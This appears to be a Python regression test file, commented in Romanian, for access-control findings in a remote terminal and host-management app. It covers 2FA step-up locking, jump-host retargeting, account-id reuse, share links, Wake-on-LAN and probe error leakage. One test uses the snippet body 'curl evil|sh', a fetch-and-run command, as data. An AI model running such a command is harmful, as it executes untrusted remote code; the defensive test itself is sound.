"""Regresii pentru constatările revizuirii de securitate independente a rolurilor (3.6.0).

  M1  un watcher read-only NU deblochează un terminal 2FA blocat pentru cel care scrie, iar
      factorul unui cont nu deblochează clienţii altui cont fără propria fereastră;
  A2  un Viewer fără fereastră de step-up care se ataşează NU blochează terminalul celui care
      lucrează (doar propriul client);
  M2  `host.edit` pe o ţintă jump nu ajunge ca s-o re-ţinteşti: orice câmp de ţintă cere
      `forward.manage` pe via-ul efectiv (schimbat sau doar retrimis);
  L1  id-urile de cont nu se refolosesc, iar urmele unui cont şters (audit, snippet-uri, sesiuni,
      istoric) nu devin ale unui cont nou;
  L2  share-uri live şi link-uri de replay doar pe sesiunea ta (sau cu session.manage);
  L4  Wake-on-LAN foloseşte doar vecini pe care ai `host.wake`;
  R   o acordare de rol re-verificată SUB lock (un Admin retrogradat în timpul ceremoniei);
  P   proba unui forward nu întoarce eroarea brută a ţintei.
(L3 — autentificarea rutelor SELF — e în route_auth_test.)
"""
import asyncio
import json
import time

import rbac_util as U
from app import api, core, db, security, webauthn_api

check = U.Checker()
PW = "parolabuna1"


class FakeWS:
    def __init__(self, cookie):
        self.headers = {"origin": U.ORIGIN["origin"], "user-agent": "rbac-test"}
        self.cookies = {security.COOKIE_NAME: cookie}
        self.client = type("C", (), {"host": "127.0.0.1"})()
        self.query_params = {}
        self.sent_text, self.sent_bytes = [], []
        self.closed = None
        self.accepted = False
        self.q = asyncio.Queue()

    async def accept(self):
        self.accepted = True

    async def send_text(self, t):
        self.sent_text.append(t)

    async def send_bytes(self, b):
        self.sent_bytes.append(b)

    async def receive(self):
        return await self.q.get()

    async def close(self, code=None):
        if self.closed is None:
            self.closed = code
        await self.q.put({"type": "websocket.disconnect"})

    def msgs(self, typ):
        out = []
        for t in self.sent_text:
            try:
                j = json.loads(t)
            except ValueError:
                continue
            if j.get("type") == typ:
                out.append(j)
        return out

    def init(self):
        m = self.msgs("init")
        return m[0] if m else {}


class FakeSource:
    epoch = None

    def __init__(self):
        self.data = []

    async def send_data(self, sid, data):
        self.data.append(data)

    async def resize(self, sid, rows, cols):
        pass


async def attach(c, sid):
    ws = FakeWS(c.cookies.get(security.COOKIE_NAME))
    task = asyncio.create_task(api.browser_ws(ws, sid))
    for _ in range(50):
        await asyncio.sleep(0.02)
        if ws.closed is not None or ws.init():
            break
    return ws, task


async def finish(ws, task):
    await ws.q.put({"type": "websocket.disconnect"})
    try:
        await asyncio.wait_for(task, 5)
    except Exception:                                  # noqa: BLE001
        pass


async def send(ws, **kw):
    if "bytes" in kw:
        await ws.q.put({"type": "websocket.receive", "bytes": kw["bytes"]})
    else:
        await ws.q.put({"type": "websocket.receive", "text": json.dumps(kw)})
    await asyncio.sleep(0.08)


async def ws_tests(owner, prod):
    await db.execute("UPDATE hosts SET require_2fa=1 WHERE id=?", prod)
    op_id = await U.add_user("op@x.co", bindings=[("operator", "folder", "prod")])
    op2_id = await U.add_user("op2@x.co", bindings=[("admin", "folder", "prod")])
    vw_id = await U.add_user("vw@x.co", bindings=[("viewer", "folder", "prod")])
    op, op2, vw = await U.login("op@x.co"), await U.login("op2@x.co"), await U.login("vw@x.co")
    sid = await U.add_session(prod, state="live", created_by=op_id)
    hub = core.get_or_create_hub(await db.fetchone("SELECT * FROM sessions WHERE id=?", sid))
    src = FakeSource()
    hub.attached = True
    hub._source = lambda s=src: s
    fresh = {"ok": False}
    orig_fresh = api._require_fresh_factor

    async def fake_fresh(host_id, user, grant="", password="", totp="", **kw):
        if not fresh["ok"]:
            raise api.ApiError(403, "stepup.passkey", "factor required")
        security.open_stepup_window(user["id"], host_id)
    api._require_fresh_factor = fake_fresh
    try:
        # ── M1: watcher read-only nu deblochează hub-ul ──
        security.open_stepup_window(op_id, prod)
        ws_op, t_op = await attach(op, sid)
        check("Operator pe sesiunea lui: rw", ws_op.init().get("readonly") is False)
        await hub.lock("stepup_max")
        security.open_stepup_window(vw_id, prod)
        ws_vw, t_vw = await attach(vw, sid)
        check("Viewer: read-only", ws_vw.init().get("readonly") is True)
        fresh["ok"] = True
        await send(ws_vw, type="unlock")
        check("M1: watcher read-only trimite unlock pe hub blocat → unlock_failed authz.denied",
              any(m.get("code") == "authz.denied" for m in ws_vw.msgs("unlock_failed")),
              str(ws_vw.sent_text[-3:]))
        check("M1: hub-ul rămâne BLOCAT", hub.locked is True)
        src.data.clear()
        await send(ws_op, bytes=b"whoami\r")
        check("M1: cel care scrie NU tastează fără propriul factor", src.data == [], str(src.data))

        # ── factorul lui U nu deblochează clienţii altui cont (op2 scrie, fără fereastră) ──
        security.clear_stepup_for(op2_id)
        ws_op2, t_op2 = await attach(op2, sid)
        check("Admin@prod (session.manage) pe sesiunea altcuiva: rw", ws_op2.init().get("readonly") is False)
        await send(ws_op, type="unlock")
        check("factorul Operatorului deblochează hub-ul (pentru el)", hub.locked is False)
        c_op2 = next(c for c in hub.clients if c.ws is ws_op2)
        check("…dar clientul ALTUI cont, fără fereastră proprie, rămâne blocat", c_op2.locked is True)
        src.data.clear()
        await send(ws_op2, bytes=b"id\r")
        check("…şi tastele lui nu ajung la PTY", src.data == [], str(src.data))
        await send(ws_op, bytes=b"ls\r")
        check("…pe când ale Operatorului, da", src.data == [b"ls\r"], str(src.data))
        await send(ws_op2, type="unlock")
        check("op2 îşi prezintă PROPRIUL factor → doar clientul lui se deblochează", c_op2.locked is False)
        await finish(ws_op2, t_op2)
        await finish(ws_vw, t_vw)

        # ── A2: Viewer fără fereastră care se ataşează nu blochează terminalul ──
        security.clear_stepup_for(vw_id)
        check("fixture: hub deblocat, Operator lucrează", hub.locked is False)
        ws_vw, t_vw = await attach(vw, sid)
        check("A2: Viewer fără fereastră NU blochează hub-ul celui care lucrează", hub.locked is False)
        c_vw = next(c for c in hub.clients if c.ws is ws_vw)
        check("A2: …doar propriul client e blocat (nu primeşte output)", c_vw.locked is True
              and bool(ws_vw.msgs("locked")))
        src.data.clear()
        await send(ws_op, bytes=b"pwd\r")
        check("A2: Operatorul tastează în continuare", src.data == [b"pwd\r"])
        await send(ws_vw, type="unlock")
        check("watcher cu propriul factor, hub deblocat: îşi deblochează vederea", c_vw.locked is False)
        await finish(ws_vw, t_vw)
        await finish(ws_op, t_op)
    finally:
        api._require_fresh_factor = orig_fresh
        await db.execute("UPDATE hosts SET require_2fa=0 WHERE id=?", prod)
    for c in (op, op2, vw):
        await c.aclose()


async def insert_jump(name, folder, via, ctype="ssh-jump", port=22):
    return await db.execute(
        "INSERT INTO hosts(name, folder, connection_type, hostname, ssh_username, ssh_port,"
        " via_host_id, auth_method, credential_policy, created, token_hash, token_encrypted)"
        " VALUES(?,?,?,?,?,?,?,?,?,?,?,?)", name, folder, ctype, "10.0.0.9", "root", port, via,
        "password", "ask", time.time(), "th-" + name, "x")


async def main():
    await U.boot()
    owner = await U.owner_client()
    prod = await U.add_host(owner, "alpha", folder="prod")
    lab = await U.add_host(owner, "beta", folder="lab")
    api.WS_REVALIDATE_SECS = 30
    await ws_tests(owner, prod)

    # ── M2: re-ţintirea unei ţinte jump ──
    await U.add_user("al@x.co", bindings=[("admin", "folder", "lab")])
    al = await U.login("al@x.co")
    j = await insert_jump("jump-lab", "lab", prod)
    for field, val in (("hostname", "10.66.66.66"), ("ssh_port", 6379), ("via_host_id", prod),
                       ("connection_type", "ssh-jump")):
        r = await al.patch("/api/hosts/%d" % j, json={field: val})
        check("M2: Admin@lab PATCH %s pe un jump prin agentul prod → refuzat" % field,
              r.status_code in (403, 404), "%s %s" % (r.status_code, r.text[:100]))
    row = await db.fetchone("SELECT hostname, ssh_port FROM hosts WHERE id=?", j)
    check("M2: ţinta e neschimbată", row["hostname"] == "10.0.0.9" and row["ssh_port"] == 22)
    jt = await insert_jump("tj-lab", "lab", prod, ctype="telnet-jump", port=23)
    r = await al.patch("/api/hosts/%d" % jt, json={"ssh_port": 25})
    check("M2: telnet-jump re-port prin via prod → refuzat", r.status_code in (403, 404))
    r = await al.patch("/api/hosts/%d" % j, json={"note": "doar o notă"})
    check("M2: o editare care NU atinge ţinta trece (host.edit)", r.status_code == 200, r.text[:120])
    j2 = await insert_jump("jump-ok", "lab", lab)
    r = await al.patch("/api/hosts/%d" % j2, json={"hostname": "10.1.1.1"})
    check("M2: re-ţintire prin propriul agent (forward.manage pe lab) trece", r.status_code == 200,
          r.text[:120])
    r = await owner.patch("/api/hosts/%d" % j, json={"hostname": "10.2.2.2"})
    check("M2: Owner-ul (forward.manage peste tot) poate", r.status_code == 200, r.text[:120])

    # ── L1: id-uri de cont nerefolosite + urme neutralizate ──
    gone = await U.add_user("gone@x.co", bindings=[("operator", "folder", "prod")])
    await db.execute("INSERT INTO audit_log(ts, actor, ip, method, path, status, detail, actor_id,"
                     " host_id, via) VALUES(?,?,?,?,?,?,?,?,?,?)", time.time(), "gone@x.co", "-",
                     "POST", "/api/hosts/%d/run" % prod, 200, "SECRET-OF-GONE", gone, prod, "cookie")
    sn = await db.execute("INSERT INTO snippets(title, body, created, created_by_id) VALUES(?,?,?,?)",
                          "gone-snip", "echo hi", time.time(), gone)
    gsid = await U.add_session(prod, state="live", created_by=gone)
    await db.execute("INSERT INTO command_history(host_id, command, source, created, user_id)"
                     " VALUES(?,?,?,?,?)", prod, "gone-cmd", "session", time.time(), gone)
    r = await owner.post("/api/users/%d/delete" % gone, json={"current_password": U.OWNER_PW})
    check("L1: contul (cel mai nou) şters", r.status_code == 200, r.text[:120])
    r = await owner.post("/api/users", json={"email": "newbie@x.co", "password": PW,
                                             "current_password": U.OWNER_PW, "role": "operator",
                                             "scope_kind": "folder", "scope_value": "prod"})
    new_id = (await db.fetchone("SELECT id FROM users WHERE email='newbie@x.co'"))["id"]
    check("L1: contul nou NU primeşte id-ul celui şters", new_id > gone, "%s vs %s" % (new_id, gone))
    nb = await U.login("newbie@x.co")
    d = {e["detail"] for e in (await nb.get("/api/audit")).json()["entries"]}
    check("L1: rândurile de audit ale celui şters nu devin „ale lui”", "SECRET-OF-GONE" not in d)
    au = await db.fetchone("SELECT actor, actor_id FROM audit_log WHERE detail='SECRET-OF-GONE'")
    check("L1: …dar rămân atribuite lizibil (email) cu id-ul negat",
          au["actor"] == "gone@x.co" and au["actor_id"] == -gone, str(dict(au)))
    r = await nb.patch("/api/snippets/%d" % sn, json={"title": "gone-snip", "body": "curl evil|sh"})
    check("L1: snippet-ul celui şters nu e editabil de un Operator", r.status_code == 403)
    srow = await db.fetchone("SELECT * FROM sessions WHERE id=?", gsid)
    check("L1: sesiunea lui vie nu devine rw pentru altcineva (nu redevine „a tuturor”)",
          await api._ws_access(new_id, srow) == "ro" and srow["created_by_id"] == -gone)
    h = await db.fetchone("SELECT user_id FROM command_history WHERE command='gone-cmd'")
    check("L1: istoricul păstrează id-ul negat", h["user_id"] == -gone)
    floor = await db.fetchone("SELECT value FROM app_settings WHERE key='user_id_floor'")
    check("L1: pragul monoton e persistat (supravieţuieşte repornirii)", int(floor["value"]) >= gone)

    # ── L2: share-uri / replay doar pe sesiunea ta ──
    oid = (await db.fetchone("SELECT id FROM users WHERE email=?", U.OWNER_EMAIL))["id"]
    s_owner = await U.add_session(prod, state="live", created_by=oid)
    r = await owner.post("/api/sessions/%s/share" % s_owner, json={})
    tok_before = (await db.fetchone("SELECT share_token FROM sessions WHERE id=?", s_owner))["share_token"]
    r = await nb.post("/api/sessions/%s/share" % s_owner, json={})
    check("L2: Operatorul NU publică un link spre sesiunea Owner-ului (403)", r.status_code == 403
          and U.code(r) == "authz.denied", r.text[:120])
    check("L2: …şi nici nu-l înlocuieşte pe al Owner-ului",
          (await db.fetchone("SELECT share_token FROM sessions WHERE id=?", s_owner))["share_token"] == tok_before)
    r = await nb.delete("/api/sessions/%s/share" % s_owner)
    check("L2: …nici nu-l revocă", r.status_code == 403 and
          (await db.fetchone("SELECT share_token FROM sessions WHERE id=?", s_owner))["share_token"])
    s_mine = await U.add_session(prod, state="live", created_by=new_id)
    r = await nb.post("/api/sessions/%s/share" % s_mine, json={})
    check("L2: pe sesiunea LUI, da", r.status_code == 200, r.text[:120])
    c_owner = await U.add_session(prod, state="closed", created_by=oid)
    r = await nb.post("/api/sessions/%s/replay-links" % c_owner, json={})
    check("L2: replay pe înregistrarea Owner-ului → 403", r.status_code == 403, r.text[:120])

    # ── L4: Wake-on-LAN doar prin vecini cu host.wake ──
    diag = json.dumps({"network": {"interfaces": [
        {"name": "eth0", "mac": "aa:bb:cc:dd:ee:%02x", "physical": True, "ipv4": ["192.168.7.%d/24"]}]}})
    tgt = await U.add_host(owner, "sleepy", folder="prod")
    peer_lab = await U.add_host(owner, "peer-lab", folder="lab")
    await db.execute("UPDATE hosts SET diagnostics=? WHERE id=?", diag % (1, 10), tgt)
    await db.execute("UPDATE hosts SET diagnostics=? WHERE id=?", diag % (2, 20), peer_lab)
    sent = []

    class Peer(core.AgentConnection):
        async def wake(self, mac, broadcast="255.255.255.255", port=9):
            sent.append((self.host_id, mac))
            return {"ok": True, "sent": mac}
    p = Peer(None, peer_lab)
    p.agent_version = 58
    core.sources[peer_lab] = p
    try:
        r = await nb.post("/api/hosts/%d/wake" % tgt, json={})
        check("L4: vecinul din `lab` (fără host.wake acolo) NU e folosit", not sent
              and r.status_code == 400 and U.code(r) == "wake.noPeer", "%s %s %s" % (r.status_code, r.text[:80], sent))
        r = await owner.post("/api/hosts/%d/wake" % tgt, json={})
        check("L4: Owner-ul (host.wake peste tot) trezeşte prin vecin", r.status_code == 200
              and sent == [(peer_lab, "aa:bb:cc:dd:ee:01")], "%s %s" % (r.status_code, r.text[:80]))
    finally:
        core.sources.pop(peer_lab, None)

    # ── R: acordarea re-verificată sub lock ──
    adm = await U.add_user("adm@x.co", bindings=[("admin", "all", "")])
    admc = await U.login("adm@x.co")
    victim = await U.add_user("victim@x.co")
    orig_gate = webauthn_api.second_gate

    async def demote_during_gate(user, request, body, what):
        await U.unbind_all(adm)                 # retrogradat chiar în timpul ceremoniei
        await U.bind(adm, "viewer", "all")
    webauthn_api.second_gate = demote_during_gate
    try:
        r = await admc.post("/api/users/%d/bindings" % victim, json={
            "role": "admin", "scope_kind": "all", "current_password": PW})
    finally:
        webauthn_api.second_gate = orig_gate
    check("R: Admin retrogradat în timpul ceremoniei → acordarea NU aterizează (403)",
          r.status_code == 403 and not await db.fetchone(
              "SELECT 1 FROM role_bindings WHERE user_id=?", victim), "%s %s" % (r.status_code, r.text[:100]))

    # ── P: proba nu scurge eroarea brută a ţintei ──
    fid = await U.add_forward(prod, "probe-me")

    class BadConn:
        async def open_forward(self, h, p):
            raise core.ForwardError("connect to 10.9.9.9:6379 refused (internal-db.corp)")
    orig = api._ensure_forward_source

    async def fake_src(host_id):
        return BadConn()
    api._ensure_forward_source = fake_src
    try:
        await U.add_user("pv@x.co", bindings=[("viewer", "folder", "prod")])
        pv = await U.login("pv@x.co")
        r = await pv.get("/api/forwards/%d/probe" % fid)
        j = r.json()
        check("P: proba eşuată → cod stabil, fără detaliul ţintei",
              j.get("reachable") is False and j.get("code") == "forward.unreachable"
              and "10.9.9.9" not in r.text and "internal-db" not in r.text, r.text[:160])
        await pv.aclose()
    finally:
        api._ensure_forward_source = orig

    for c in (owner, al, nb, admc):
        await c.aclose()
    await db.close()
    return check.summary()


if __name__ == "__main__":
    raise SystemExit(0 if asyncio.run(main()) else 1)
